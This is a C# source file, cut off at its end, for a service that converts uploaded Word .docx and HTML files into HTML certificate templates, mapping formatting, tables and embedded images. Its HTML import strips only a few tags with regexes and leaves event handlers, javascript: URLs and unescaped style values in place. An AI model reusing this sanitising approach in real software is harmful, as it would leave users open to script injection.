using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml.Linq;

namespace BDIMS.Services
{
    public class TemplateImportResult
    {
        public bool Success { get; init; }

        public string Html { get; init; } = "";

        public string Message { get; init; } = "";

        public string SourceLabel { get; init; } = "";

        public static TemplateImportResult Fail(string message) =>
            new() { Success = false, Message = message };
    }

    /// <summary>
    /// Converts uploaded documents into the HTML layout structure stored on
    /// CertificateTemplate.TemplateHtml.
    ///
    /// .docx is an OPC (zip) package of WordprocessingML, so it is parsed directly with
    /// System.IO.Compression + System.Xml.Linq — no third-party converter is required.
    /// The mapping is intentionally best-effort: paragraphs, runs, bold/italic/underline,
    /// alignment, headings, lists, tables and inline images are carried over, but complex
    /// Word features (multi-column layouts, floating shapes, headers/footers, styles beyond
    /// the basic ones) are dropped because the print pipeline renders a web document.
    ///
    /// Embedded images are inlined as data URIs so the letterhead survives printing
    /// without depending on a separately uploaded file.
    /// </summary>
    public static class DocumentTemplateImporter
    {
        private static readonly XNamespace W =
            "http://schemas.openxmlformats.org/wordprocessingml/2006/main";

        private static readonly XNamespace R =
            "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

        private static readonly XNamespace A =
            "http://schemas.openxmlformats.org/drawingml/2006/main";

        private static readonly XNamespace V =
            "urn:schemas-microsoft-com:vml";

        private const int MaxFileBytes = 8 * 1024 * 1024;
        private const int MaxMediaEntries = 24;

        private static readonly string[] AllowedExtensions = { ".docx", ".html", ".htm" };

        public static TemplateImportResult Import(string? fileName, Stream? stream)
        {
            if (stream == null || stream.Length == 0)
            {
                return TemplateImportResult.Fail("The uploaded file is empty.");
            }

            if (stream.Length > MaxFileBytes)
            {
                return TemplateImportResult.Fail(
                    "File is larger than the 8 MB import limit.");
            }

            var name = Path.GetFileName(fileName ?? "").Trim();
            var extension = Path.GetExtension(name).ToLowerInvariant();

            if (!AllowedExtensions.Contains(extension))
            {
                return TemplateImportResult.Fail(
                    "Only .docx and .html files can be imported. PDF is not supported because it is a fixed-layout format with no reusable template structure.");
            }

            return extension switch
            {
                ".docx" => ImportDocx(stream, name),
                _ => ImportHtml(stream, name)
            };
        }

        // ---------------------------------------------------------------- HTML

        public static TemplateImportResult ImportHtml(Stream stream, string name)
        {
            string raw;

            using (var reader = new StreamReader(stream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true))
            {
                raw = reader.ReadToEnd();
            }

            if (string.IsNullOrWhiteSpace(raw))
            {
                return TemplateImportResult.Fail("The uploaded .html file is empty.");
            }

            var body = ExtractBody(raw);

            body = RemoveElement(body, "script");
            body = RemoveElement(body, "style");
            body = RemoveElement(body, "head");
            body = RemoveElement(body, "noscript");
            body = Regex.Replace(body, @"<!--.*?-->", string.Empty, RegexOptions.Singleline);
            body = Regex.Replace(body, @"<\s*(meta|link|title)\b[^>]*>", string.Empty, RegexOptions.IgnoreCase);
            body = Regex.Replace(body, @"<\s*/\s*(meta|link|title)\s*>", string.Empty, RegexOptions.IgnoreCase);

            // An <img> without a usable source prints as a broken icon; drop those.
            body = Regex.Replace(
                body,
                @"<img\b[^>]*>",
                match => ImageHasSource(match.Value) ? match.Value : string.Empty,
                RegexOptions.IgnoreCase);

            return Wrap(
                Normalize(body),
                name,
                "Imported from " + name);
        }

        private static string ExtractBody(string html)
        {
            var match = Regex.Match(
                html,
                @"<body\b[^>]*>(?<inner>.*?)(?:</body\s*>|\z)",
                RegexOptions.IgnoreCase | RegexOptions.Singleline);

            return match.Success ? match.Groups["inner"].Value : html;
        }

        private static string RemoveElement(string html, string tagName) =>
            Regex.Replace(
                html,
                $@"<\s*{tagName}\b[^>]*>.*?<\s*/\s*{tagName}\s*>",
                string.Empty,
                RegexOptions.IgnoreCase | RegexOptions.Singleline);

        /// <summary>
        /// True when an &lt;img&gt; tag carries a non-empty src. The value may be quoted
        /// with either quote character or left unquoted.
        /// </summary>
        private static bool ImageHasSource(string tag)
        {
            var src = Regex.Match(
                tag,
                @"\bsrc\s*=\s*(?:""([^""]*)""|'([^']*)'|([^\s>]+))",
                RegexOptions.IgnoreCase);

            if (!src.Success)
            {
                return false;
            }

            var value = src.Groups[1].Success ? src.Groups[1].Value
                : src.Groups[2].Success ? src.Groups[2].Value
                : src.Groups[3].Value;

            return value.Trim().Length > 0;
        }

        // ---------------------------------------------------------------- DOCX

        public static TemplateImportResult ImportDocx(Stream stream, string name)
        {
            // Confirm the OPC/ZIP signature before handing the stream to ZipArchive so a
            // renamed file fails with a clear message instead of InvalidDataException.
            Span<byte> signature = stackalloc byte[4];
            var read = stream.Read(signature);
            if (read < 4 || signature[0] != 0x50 || signature[1] != 0x4B)
            {
                return TemplateImportResult.Fail(
                    "That file is not a valid .docx package. Re-save the document from Word as .docx (not .doc).");
            }

            stream.Position = 0;

            try
            {
                using var archive = new ZipArchive(stream, ZipArchiveMode.Read, leaveOpen: true);

                var document = archive.GetEntry("word/document.xml")
                    ?? archive.Entries.FirstOrDefault(e =>
                        e.FullName.EndsWith("document.xml", StringComparison.OrdinalIgnoreCase) &&
                        e.FullName.StartsWith("word/", StringComparison.OrdinalIgnoreCase));

                if (document == null)
                {
                    return TemplateImportResult.Fail(
                        "The .docx package contains no word/document.xml, so there is no document body to import.");
                }

                var documentXml = ReadXml(document);
                if (documentXml == null)
                {
                    return TemplateImportResult.Fail("word/document.xml in the uploaded file is not valid XML.");
                }

                var media = ReadMedia(archive);
                var relationships = ReadRelationships(archive);

                var body = documentXml.Root?.Element(W + "body");
                if (body == null)
                {
                    return TemplateImportResult.Fail("The uploaded document has an empty body.");
                }

                var html = new StringBuilder();
                foreach (var node in body.Elements())
                {
                    AppendBlock(node, html, media, relationships);
                }

                var result = Normalize(html.ToString());

                if (string.IsNullOrWhiteSpace(StripTags(result)))
                {
                    return TemplateImportResult.Fail(
                        "No readable content was found in the document. Documents made only of text boxes, charts or floating shapes cannot be imported.");
                }

                return Wrap(result, name, "Imported from " + name);
            }
            catch (InvalidDataException)
            {
                return TemplateImportResult.Fail("The .docx package could not be opened — the file appears to be corrupt.");
            }
            catch (System.Xml.XmlException)
            {
                return TemplateImportResult.Fail("The uploaded document contains malformed XML and could not be converted.");
            }
        }

        private const int MaxEntryBytes = 4 * 1024 * 1024;

        // ZipArchiveEntry.Length is the uncompressed size and is available without
        // reading the entry, so it can be checked before Open(). Checking after CopyTo
        // was too late: a crafted .docx compresses far more than it uploads, and the
        // entry was already fully expanded into memory by then.
        private static XDocument? ReadXml(ZipArchiveEntry entry)
        {
            if (entry.Length > MaxEntryBytes)
            {
                return null;
            }

            using var stream = entry.Open();
            return XDocument.Load(stream);
        }

        private static Dictionary<string, string> ReadRelationships(ZipArchive archive)
        {
            var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            var rels = archive.GetEntry("word/_rels/document.xml.rels");
            if (rels == null)
            {
                return map;
            }

            var xml = ReadXml(rels);
            if (xml?.Root == null)
            {
                return map;
            }

            foreach (var rel in xml.Root.Elements())
            {
                var id = rel.Attribute("Id")?.Value;
                var target = rel.Attribute("Target")?.Value;

                if (string.IsNullOrWhiteSpace(id) || string.IsNullOrWhiteSpace(target))
                {
                    continue;
                }

                // Targets are relative to word/ unless they are already rooted.
                var normalised = target.StartsWith("/media/", StringComparison.OrdinalIgnoreCase)
                    ? "word" + target
                    : "word/" + target.TrimStart('.', '/');

                map[id!] = normalised;
            }

            return map;
        }

        /// <summary>
        /// Inlines word/media/* as data URIs so imported letterheads print without a
        /// separate file on disk.
        /// </summary>
        private static Dictionary<string, string> ReadMedia(ZipArchive archive)
        {
            var media = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            var entries = archive.Entries
                .Where(e => e.FullName.StartsWith("word/media/", StringComparison.OrdinalIgnoreCase))
                .Take(MaxMediaEntries)
                .ToList();

            foreach (var entry in entries)
            {
                try
                {
                    // Uncompressed size, checked before the entry is expanded. A repeated
                    // XML payload can deflate to a tiny upload and expand to gigabytes, so
                    // capping the upload alone does not bound memory use.
                    if (entry.Length == 0 || entry.Length > MaxEntryBytes)
                    {
                        continue;
                    }

                    var mime = MimeForImage(entry.FullName);
                    if (mime == null)
                    {
                        continue;
                    }

                    using var buffer = new MemoryStream();
                    using (var source = entry.Open())
                    {
                        source.CopyTo(buffer);
                    }

                    // Re-check what actually landed, in case the header lied.
                    if (buffer.Length == 0 || buffer.Length > MaxEntryBytes)
                    {
                        continue;
                    }

                    media[entry.FullName] =
                        $"data:{mime};base64,{Convert.ToBase64String(buffer.ToArray())}";
                }
                catch (Exception ex) when (ex is InvalidDataException or NotSupportedException)
                {
                    // A single unreadable image should not fail the whole import.
                }
            }

            return media;
        }

        private static string? MimeForImage(string path)
        {
            var extension = Path.GetExtension(path).ToLowerInvariant();

            return extension switch
            {
                ".png" => "image/png",
                ".jpg" or ".jpeg" => "image/jpeg",
                ".gif" => "image/gif",
                ".bmp" => "image/bmp",
                ".tif" or ".tiff" => "image/tiff",
                ".svg" => "image/svg+xml",
                ".emf" or ".wmf" => null,
                _ => null
            };
        }

        // ------------------------------------------------------- DOCX -> HTML

        private static void AppendBlock(
            XElement node,
            StringBuilder html,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            if (node.Name == W + "p")
            {
                AppendParagraph(node, html, media, relationships);
                return;
            }

            if (node.Name == W + "tbl")
            {
                AppendTable(node, html, media, relationships);
                return;
            }

            // w:sectPr and w:bookmarkStart/End carry no printable content.
        }

        private static void AppendParagraph(
            XElement paragraph,
            StringBuilder html,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            var properties = paragraph.Element(W + "pPr");
            var style = properties?.Element(W + "pStyle")?.Attribute(W + "val")?.Value ?? "";
            var isListItem = properties?.Element(W + "numPr") != null;

            var inner = new StringBuilder();
            foreach (var run in paragraph.Elements(W + "r"))
            {
                AppendRun(run, inner, media, relationships);
            }

            // Word happily splits one run in two, so a typed placeholder can arrive with a
            // formatting tag in the middle of it. Stitching the halves back together keeps
            // {{ Token }} recognisable and exactly where the author put it.
            var content = StitchTokens(inner.ToString().Trim());
            var tag = ResolveBlockTag(style, isListItem);
            var attributes = StyleAttribute(properties);

            html.Append('<').Append(tag);
            if (attributes.Length > 0)
            {
                html.Append(" style=\"").Append(attributes).Append('"');
            }
            html.Append('>');
            html.Append(content.Length > 0 ? content : "&nbsp;");

            // The closing bracket has to be written too. Emitting "</p" instead of
            // "</p>" leaves every paragraph malformed: browsers recover when rendering,
            // but the HTML Source view shows broken markup and any tool that scans the
            // markup for tag boundaries (the layout normaliser, for one) mis-reads where
            // one paragraph ends and the next begins.
            html.Append("</").Append(tag).Append('>').Append('\n');
        }

        private static void AppendRun(
            XElement run,
            StringBuilder html,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            var properties = run.Element(W + "rPr");
            var isBold = IsOn(properties?.Element(W + "b"));
            var isItalic = IsOn(properties?.Element(W + "i"));
            var isUnderline = properties?.Element(W + "u") != null
                && !string.Equals(
                    properties.Element(W + "u")?.Attribute(W + "val")?.Value,
                    "none",
                    StringComparison.OrdinalIgnoreCase);
            var isStrike = IsOn(properties?.Element(W + "strike"));
            var isSuperscript = IsOn(properties?.Element(W + "vertAlign"), "superscript");
            var isSubscript = IsOn(properties?.Element(W + "vertAlign"), "subscript");
            var align = properties?.Element(W + "jc")?.Attribute(W + "val")?.Value;
            var halfPoints = properties?.Element(W + "sz")?.Attribute(W + "val")?.Value;
            var colour = properties?.Element(W + "color")?.Attribute(W + "val")?.Value;
            var highlight = properties?.Element(W + "highlight")?.Attribute(W + "val")?.Value;
            var fontName = properties?.Element(W + "rFonts")?.Attribute(W + "ascii")?.Value;
            var isCaps = properties?.Element(W + "caps") != null || properties?.Element(W + "smallCaps") != null;
            var charSpacing = properties?.Element(W + "spacing")?.Attribute(W + "val")?.Value;

            var text = new StringBuilder();

            foreach (var child in run.Elements())
            {
                if (child.Name == W + "t")
                {
                    text.Append(child.Value);
                }
                else if (child.Name == W + "tab")
                {
                    text.Append("&emsp;");
                }
                else if (child.Name == W + "br")
                {
                    text.Append("<br />");
                }
                else if (child.Name == W + "noBreakHyphen")
                {
                    text.Append('-');
                }
                else if (child.Name == W + "drawing")
                {
                    text.Append(RenderInlineImage(child, media, relationships));
                }
                else if (child.Name == W + "pict")
                {
                    text.Append(RenderLegacyImage(child, media, relationships));
                }

                // w:sym (Symbol-font glyphs) and w:proofErr have no reliable web
                // equivalent and are intentionally skipped.
            }

            if (text.Length == 0)
            {
                return;
            }

            var formatted = text.ToString();

            if (isBold) formatted = "<strong>" + formatted + "</strong>";
            if (isItalic) formatted = "<em>" + formatted + "</em>";
            if (isUnderline) formatted = "<u>" + formatted + "</u>";
            if (isStrike) formatted = "<s>" + formatted + "</s>";
            if (isSuperscript) formatted = "<sup>" + formatted + "</sup>";
            if (isSubscript) formatted = "<sub>" + formatted + "</sub>";

            formatted = ApplyInlineStyle(
                formatted,
                alignment: align,
                halfPoints: halfPoints,
                colour: colour,
                highlight: highlight,
                fontName: fontName,
                caps: isCaps,
                charSpacing: charSpacing);

            html.Append(formatted);
        }

        private static string ApplyInlineStyle(
            string html,
            string? alignment,
            string? halfPoints,
            string? colour,
            string? highlight = null,
            string? fontName = null,
            bool caps = false,
            string? charSpacing = null)
        {
            var declarations = new List<string>(7);

            var textAlign = MapAlignment(alignment);
            if (textAlign != null)
            {
                declarations.Add("text-align: " + textAlign);
            }

            if (int.TryParse(halfPoints, NumberStyles.Integer, CultureInfo.InvariantCulture, out var half)
                && half > 0)
            {
                declarations.Add("font-size: " + (half / 2.0).ToString("0.##", CultureInfo.InvariantCulture) + "pt");
            }

            if (IsRealColour(colour))
            {
                declarations.Add("color: #" + colour!.TrimStart('#'));
            }

            var highlightColour = HighlightColour(highlight);
            if (highlightColour != null)
            {
                declarations.Add("background-color: " + highlightColour);
            }

            if (!string.IsNullOrWhiteSpace(fontName))
            {
                declarations.Add("font-family: '" + fontName!.Trim() + "', serif");
            }

            if (caps)
            {
                declarations.Add("text-transform: uppercase");
            }

            var letterSpacing = Points(charSpacing);
            if (letterSpacing != null)
            {
                declarations.Add("letter-spacing: " + letterSpacing + "pt");
            }

            if (declarations.Count == 0)
            {
                return html;
            }

            return "<span style=\"" + string.Join("; ", declarations) + "\">" + html + "</span>";
        }

        private static string RenderInlineImage(
            XElement drawing,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            var blip = drawing.Descendants(A + "blip").FirstOrDefault();
            var embedId = blip?.Attribute(R + "embed")?.Value;

            if (string.IsNullOrWhiteSpace(embedId)
                || !relationships.TryGetValue(embedId!, out var target)
                || !media.TryGetValue(target, out var dataUri))
            {
                return string.Empty;
            }

            var name = drawing.Descendants()
                .Select(e => e.Attribute("name")?.Value)
                .FirstOrDefault(n => !string.IsNullOrWhiteSpace(n)) ?? "image";

            var extent = drawing.Descendants()
                .FirstOrDefault(e => e.Name.LocalName == "extent");

            // Exact printed size taken from wp:extent. Nothing is scaled to fit the
            // container, so a seal measuring 100pt in Word measures 100pt here as well.
            var size = new StringBuilder();

            if (extent?.Attribute("cx")?.Value is { } cx
                && long.TryParse(cx, out var emuWidth))
            {
                var width = Inches(emuWidth);
                if (width != null)
                {
                    size.Append("width: ").Append(width).Append("; ");
                }
            }

            if (extent?.Attribute("cy")?.Value is { } cy
                && long.TryParse(cy, out var emuHeight))
            {
                var height = Inches(emuHeight);
                if (height != null)
                {
                    size.Append("height: ").Append(height).Append("; ");
                }
            }

            // A floating (wp:anchor) drawing keeps the side Word placed it on, so left
            // and right seals stay on the left and right. An inline drawing takes its
            // position from the alignment of the paragraph that contains it.
            if (drawing.Descendants().Any(e => e.Name.LocalName == "anchor"))
            {
                var side = drawing.Descendants()
                    .FirstOrDefault(e => e.Name.LocalName == "positionH")?
                    .Descendants()
                    .FirstOrDefault()?
                    .Value?
                    .Trim()
                    .ToLowerInvariant();

                if (side == "left" || side == "inside")
                {
                    size.Append("float: left; ");
                }
                else if (side == "right" || side == "outside")
                {
                    size.Append("float: right; ");
                }

                size.Append("display: block; ");
            }

            return $"<img src=\"{dataUri}\" alt=\"{System.Net.WebUtility.HtmlEncode(name)}\" style=\"{size}\" />";
        }

        // 914400 EMU to an inch. A size outside a sane range is dropped rather than
        // clamped, so a layout is never quietly distorted.
        private static string? Inches(long emu)
        {
            if (emu <= 0)
            {
                return null;
            }

            var value = emu / 914400.0;
            return value > 0.01 && value <= 200
                ? value.ToString("0.###", CultureInfo.InvariantCulture) + "in"
                : null;
        }

        private static string RenderLegacyImage(
            XElement pict,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            var imageData = pict.Descendants(V + "imagedata").FirstOrDefault();
            var id = imageData?.Attribute(R + "id")?.Value;

            if (string.IsNullOrWhiteSpace(id)
                || !relationships.TryGetValue(id!, out var target)
                || !media.TryGetValue(target, out var dataUri))
            {
                return string.Empty;
            }

            // Legacy VML shapes carry their own measurements in a style string
            // ("width:75pt;height:90pt"), so those are read out rather than being replaced
            // by a generic size that would rescale the logo.
            var shapeStyle = pict.Descendants(V + "shape").FirstOrDefault()?.Attribute("style")?.Value ?? string.Empty;

            var size = new StringBuilder();

            var width = VmlDimension(shapeStyle, "width");
            if (width != null)
            {
                size.Append("width: ").Append(width).Append("; ");
            }

            var height = VmlDimension(shapeStyle, "height");
            if (height != null)
            {
                size.Append("height: ").Append(height).Append("; ");
            }

            if (shapeStyle.IndexOf("mso-position-horizontal:right", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                size.Append("float: right; ");
            }
            else if (shapeStyle.IndexOf("mso-position-horizontal:left", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                size.Append("float: left; ");
            }

            return $"<img src=\"{dataUri}\" alt=\"image\" style=\"{size}\" />";
        }

        /// <summary>Reads one "width"/"height" entry out of a VML style attribute.</summary>
        private static string? VmlDimension(string style, string name)
        {
            var match = Regex.Match(
                style,
                @"(?:^|;)\s*" + Regex.Escape(name) + @"\s*:\s*([0-9.]+)\s*(pt|in|cm|mm|px)?",
                RegexOptions.IgnoreCase);

            if (!match.Success)
            {
                return null;
            }

            var value = match.Groups[1].Value;
            var unit = match.Groups[2].Success
                ? match.Groups[2].Value.ToLowerInvariant()
                : "pt";

            return unit switch
            {
                "in" => value + "in",
                "cm" => value + "cm",
                "mm" => value + "mm",
                "px" => value + "px",
                _ => value + "pt"
            };
        }

        private static void AppendTable(
            XElement table,
            StringBuilder html,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships)
        {
            var properties = table.Element(W + "tblPr");

            // Every table level declaration comes from w:tblPr, so the grid keeps the
            // width, alignment, borders and cell margins the author set instead of
            // being stretched to 100% with a fixed 1px rule.
            var tableStyle = new List<string> { "border-collapse: collapse" };

            var tableWidth = WidthCss(properties?.Element(W + "tblW"));
            if (tableWidth != null)
            {
                tableStyle.Add("width: " + tableWidth);
            }

            switch (properties?.Element(W + "jc")?.Attribute(W + "val")?.Value?.Trim().ToLowerInvariant())
            {
                case "center":
                    tableStyle.Add("margin-left: auto");
                    tableStyle.Add("margin-right: auto");
                    break;
                case "right":
                    tableStyle.Add("margin-left: auto");
                    break;
            }

            if (string.Equals(
                properties?.Element(W + "tblLayout")?.Attribute(W + "type")?.Value,
                "fixed",
                StringComparison.OrdinalIgnoreCase))
            {
                tableStyle.Add("table-layout: fixed");
            }

            var tableBorders = properties?.Element(W + "tblBorders");

            // Only the four outer edges go on the table element. insideH/insideV would
            // collide with those same four properties on a single element, and the last
            // declaration wins, which would quietly destroy the outside border. The
            // internal gridlines are handed to the cells instead.
            AddBorder(tableStyle, tableBorders, "top", "border-top");
            AddBorder(tableStyle, tableBorders, "left", "border-left");
            AddBorder(tableStyle, tableBorders, "bottom", "border-bottom");
            AddBorder(tableStyle, tableBorders, "right", "border-right");

            html.Append("<table style=\"").Append(string.Join("; ", tableStyle)).Append("\">\n");

            // Column widths keep the proportions of the authored grid.
            var columns = ColumnWidths(table);
            if (columns.Count > 0)
            {
                html.Append("<colgroup>");

                foreach (var column in columns)
                {
                    html.Append("<col style=\"width: ").Append(column).Append("%\" />");
                }

                html.Append("</colgroup>\n");
            }

            var padding = CellPadding(properties?.Element(W + "tblCellMar"));

            foreach (var row in table.Elements(W + "tr"))
            {
                var cells = row.Elements(W + "tc").ToList();
                html.Append("<tr>");

                for (var i = 0; i < cells.Count; i++)
                {
                    // A w:vMerge continuation is already covered by the rowspan written on
                    // the cell that started the merge.
                    if (IsVerticalMergeContinuation(cells[i].Element(W + "tcPr")))
                    {
                        continue;
                    }

                    AppendCell(
                        cells[i],
                        cells[i].Element(W + "tcPr"),
                        tableBorders,
                        padding,
                        CountRowSpan(cells, i),
                        media,
                        relationships,
                        html);
                }

                html.Append("</tr>\n");
            }

            html.Append("</table>\n");
        }

        /// <summary>
        /// Emits one w:tc. Width, padding, borders, shading, vertical alignment and the
        /// w:gridSpan / w:vMerge spans all come from the cell's own properties, so the
        /// grid is not flattened into a uniform box.
        /// </summary>
        private static void AppendCell(
            XElement cell,
            XElement? cellProperties,
            XElement? tableBorders,
            string? padding,
            int rowSpan,
            Dictionary<string, string> media,
            Dictionary<string, string> relationships,
            StringBuilder html)
        {
            var style = new List<string>();

            var width = WidthCss(cellProperties?.Element(W + "tcW"));
            if (width != null)
            {
                style.Add("width: " + width);
            }

            if (padding != null)
            {
                style.Add("padding: " + padding);
            }

            var cellBorders = cellProperties?.Element(W + "tcBorders");
            AddBorder(style, cellBorders, "top", "border-top");
            AddBorder(style, cellBorders, "left", "border-left");
            AddBorder(style, cellBorders, "bottom", "border-bottom");
            AddBorder(style, cellBorders, "right", "border-right");

            // Internal gridlines come from the table's insideH / insideV, unless this
            // cell already sets its own edge for that side.
            if (cellBorders?.Element(W + "bottom") == null)
            {
                AddBorder(style, tableBorders, "insideH", "border-bottom");
            }

            if (cellBorders?.Element(W + "right") == null)
            {
                AddBorder(style, tableBorders, "insideV", "border-right");
            }

            var shade = cellProperties?.Element(W + "shd")?.Attribute(W + "fill")?.Value;
            if (IsRealColour(shade))
            {
                style.Add("background-color: #" + shade!.TrimStart('#'));
            }

            switch (cellProperties?.Element(W + "vAlign")?.Attribute(W + "val")?.Value?.Trim().ToLowerInvariant())
            {
                case "center":
                    style.Add("vertical-align: middle");
                    break;
                case "bottom":
                    style.Add("vertical-align: bottom");
                    break;
            }

            var content = new StringBuilder();

            foreach (var block in cell.Elements())
            {
                if (block.Name == W + "p")
                {
                    // Reuse the paragraph converter so alignment, spacing and runs inside a
                    // cell survive exactly as they do in the body.
                    AppendParagraph(block, content, media, relationships);
                }
                else if (block.Name == W + "tbl")
                {
                    var nested = new StringBuilder();
                    AppendTable(block, nested, media, relationships);
                    content.Append(nested.ToString().Trim()).Append('\n');
                }
            }

            var inner = content.ToString().Trim();
            if (inner.Length == 0)
            {
                inner = "&nbsp;";
            }

            var columnSpan = ParseInt(cellProperties?.Element(W + "gridSpan")?.Attribute(W + "val")?.Value);

            html.Append("<td");

            if (columnSpan > 1)
            {
                html.Append(" colspan=\"").Append(columnSpan).Append('"');
            }

            if (rowSpan > 1)
            {
                html.Append(" rowspan=\"").Append(rowSpan).Append('"');
            }

            html.Append(" style=\"").Append(string.Join("; ", style)).Append("\">")
                .Append(inner)
                .Append("</td>");
        }

        private static void AddBorder(List<string> declarations, XElement? borders, string side, string property)
        {
            var css = BorderCss(borders?.Element(W + side), property);
            if (css != null)
            {
                declarations.Add(css);
            }
        }

        /// <summary>
        /// w:tblW / w:tcW are either a percentage (w:type="pct", stored in fiftieths of a
        /// percent) or an absolute width in twips, and either form is emitted as authored.
        /// The measurement attribute on these elements is w:w, not w:val.
        /// </summary>
        private static string? WidthCss(XElement? width)
        {
            if (width == null)
            {
                return null;
            }

            var value = ParseInt(width.Attribute(W + "w")?.Value);
            if (value <= 0)
            {
                return null;
            }

            if (string.Equals(width.Attribute(W + "type")?.Value, "pct", StringComparison.OrdinalIgnoreCase))
            {
                return (value / 50.0).ToString("0.##", CultureInfo.InvariantCulture) + "%";
            }

            var points = Points(value.ToString(CultureInfo.InvariantCulture));
            return points == null ? null : points + "pt";
        }

        /// <summary>w:tblCellMar as a padding shorthand applied to the cells.</summary>
        private static string? CellPadding(XElement? cellMargins)
        {
            if (cellMargins == null)
            {
                return null;
            }

            var top = Points(cellMargins.Element(W + "top")?.Attribute(W + "w")?.Value);
            var left = Points(cellMargins.Element(W + "left")?.Attribute(W + "w")?.Value)
                       ?? Points(cellMargins.Element(W + "start")?.Attribute(W + "w")?.Value);
            var bottom = Points(cellMargins.Element(W + "bottom")?.Attribute(W + "w")?.Value);
            var right = Points(cellMargins.Element(W + "right")?.Attribute(W + "w")?.Value)
                        ?? Points(cellMargins.Element(W + "end")?.Attribute(W + "w")?.Value);

            if (top == null && left == null && bottom == null && right == null)
            {
                return null;
            }

            return $"{top ?? "0"}pt {right ?? "0"}pt {bottom ?? "0"}pt {left ?? "0"}pt";
        }

        /// <summary>Column widths as a percentage of the grid, keeping its proportions.</summary>
        private static List<string> ColumnWidths(XElement table)
        {
            var widths = table.Element(W + "tblGrid")?
                .Elements(W + "gridCol")
                .Select(column => ParseInt(column.Attribute(W + "w")?.Value))
                .Where(width => width > 0)
                .ToList();

            if (widths == null || widths.Count == 0)
            {
                return new List<string>();
            }

            var total = widths.Sum();
            if (total <= 0)
            {
                return new List<string>();
            }

            return widths
                .Select(width => (width * 100.0 / total).ToString("0.##", CultureInfo.InvariantCulture))
                .ToList();
        }

        private static bool IsVerticalMergeContinuation(XElement? cellProperties)
        {
            var merge = cellProperties?.Element(W + "vMerge");
            if (merge == null)
            {
                return false;
            }

            var value = merge.Attribute(W + "val")?.Value;
            return value == null || string.Equals(value, "continue", StringComparison.OrdinalIgnoreCase);
        }

        private static int CountRowSpan(List<XElement> cells, int index)
        {
            var span = 1;

            for (var i = index + 1; i < cells.Count && IsVerticalMergeContinuation(cells[i].Element(W + "tcPr")); i++)
            {
                span++;
            }

            return span;
        }

        private static string ResolveBlockTag(string style, bool isListItem)
        {
            if (isListItem)
            {
                return "li";
            }

            var name = style.Replace(" ", string.Empty).ToLowerInvariant();

            return name switch
            {
                "title" => "h1",
                "subtitle" => "h2",
                "heading1" => "h1",
                "heading2" => "h2",
                "heading3" => "h3",
                "heading4" => "h4",
                "heading5" => "h5",
                "heading6" => "h6",
                "quote" or "intensequote" => "blockquote",
                "caption" => "p",
                _ => "p"
            };
        }

        /// <summary>
        /// Rebuilds a paragraph's inline style straight from w:pPr, so alignment,
        /// spacing before/after, line height, indentation, shading and paragraph borders
        /// all survive the import as Word had them. A property the document does not set
        /// contributes nothing, so no default is imposed on the author's layout.
        /// </summary>
        private static string StyleAttribute(XElement? properties)
        {
            if (properties == null)
            {
                return string.Empty;
            }

            var declarations = new List<string>();

            var textAlign = MapAlignment(properties.Element(W + "jc")?.Attribute(W + "val")?.Value);
            if (textAlign != null)
            {
                declarations.Add("text-align: " + textAlign);
            }

            var spacing = properties.Element(W + "spacing");
            if (spacing != null)
            {
                Add(declarations, "margin-top", Length(spacing.Attribute(W + "before")?.Value));
                Add(declarations, "margin-bottom", Length(spacing.Attribute(W + "after")?.Value));

                var line = ParseInt(spacing.Attribute(W + "line")?.Value);
                if (line > 0)
                {
                    var rule = spacing.Attribute(W + "lineRule")?.Value ?? "auto";

                    if (string.Equals(rule, "auto", StringComparison.OrdinalIgnoreCase))
                    {
                        // w:line is a multiple of 240 when lineRule is "auto".
                        declarations.Add(
                            "line-height: " + (line / 240.0).ToString("0.###", CultureInfo.InvariantCulture));
                    }
                    else if (string.Equals(rule, "exact", StringComparison.OrdinalIgnoreCase))
                    {
                        Add(declarations, "line-height", Points(line.ToString(CultureInfo.InvariantCulture)) + "pt");
                    }
                }
            }

            var indent = properties.Element(W + "ind");
            if (indent != null)
            {
                Add(declarations, "margin-left", Length(indent.Attribute(W + "left")?.Value ?? indent.Attribute(W + "start")?.Value));
                Add(declarations, "margin-right", Length(indent.Attribute(W + "end")?.Value ?? indent.Attribute(W + "right")?.Value));

                var firstLine = ParseInt(indent.Attribute(W + "firstLine")?.Value);
                var hanging = ParseInt(indent.Attribute(W + "hanging")?.Value);

                if (firstLine > 0)
                {
                    Add(declarations, "text-indent", Points(firstLine.ToString(CultureInfo.InvariantCulture)) + "pt");
                }
                else if (hanging > 0)
                {
                    Add(declarations, "text-indent", "-" + Points(hanging.ToString(CultureInfo.InvariantCulture)) + "pt");
                }
            }

            var shade = properties.Element(W + "shd")?.Attribute(W + "fill")?.Value;
            if (IsRealColour(shade))
            {
                declarations.Add("background-color: #" + shade!.TrimStart('#'));
            }

            var border = BorderCss(properties.Element(W + "pBdr")?.Element(W + "bottom"), "border-bottom");
            if (border != null)
            {
                declarations.Add(border);
            }

            return declarations.Count == 0 ? string.Empty : string.Join("; ", declarations);
        }

        private static void Add(List<string> declarations, string property, string? value)
        {
            if (!string.IsNullOrWhiteSpace(value))
            {
                declarations.Add(property + ": " + value);
            }
        }

        // Word measures in twips: 20 twips to a point.
        private static string? Points(string? twips)
        {
            var value = ParseInt(twips);
            return value == 0
                ? null
                : (value / 20.0).ToString("0.##", CultureInfo.InvariantCulture);
        }

        /// <summary>
        /// A twips measurement as a CSS length. The unit is always written out, because a
        /// bare number is an invalid CSS length and the browser would drop the rule.
        /// </summary>
        private static string? Length(string? twips)
        {
            var value = Points(twips);
            return value == null ? null : value + "pt";
        }

        private static int ParseInt(string? value) =>
            int.TryParse(value, NumberStyles.Integer, CultureInfo.InvariantCulture, out var parsed)
                ? parsed
                : 0;

        private static bool IsRealColour(string? value) =>
            !string.IsNullOrWhiteSpace(value)
